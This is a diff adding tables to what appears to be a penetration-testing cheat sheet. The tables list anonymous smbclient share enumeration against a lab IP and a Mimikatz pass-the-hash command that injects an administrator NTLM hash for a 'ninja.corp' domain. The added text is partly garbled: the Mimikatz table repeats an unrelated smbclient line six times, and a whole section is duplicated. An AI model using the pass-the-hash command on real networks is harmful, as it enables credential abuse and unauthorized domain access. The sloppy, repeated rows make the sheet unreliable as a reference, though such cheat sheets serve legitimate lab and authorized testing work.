@@ -125,3 +125,29 @@
 | Get-NetFileServer | get a list of file servers used by current domain users|
 
 
+
+| Linxu and Microsoft RPC Enumeration  |
+| ------------- |
+| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
+| smbclient -N -L \\\\10.10.10.103 |
+
+
+
+
+| MiMiKatz  |
+| ------------- |
+|Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:ninja.corp  /target:ninja.corp /ntlm:a87f3a337d73085c45f9416be5787d86 /ptt "'|
+| smbclient -N -L \\\\10.10.10.103 |
+| smbclient -N -L \\\\10.10.10.103 |
+| smbclient -N -L \\\\10.10.10.103 |
+| smbclient -N -L \\\\10.10.10.103 |
+| smbclient -N -L \\\\10.10.10.103 |
+| smbclient -N -L \\\\10.10.10.103 |
+
+
+
+
+| Linxu and Microsoft RPC Enumeration  |
+| ------------- |
+| smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
+| smbclient -N -L \\\\10.10.10.103 |
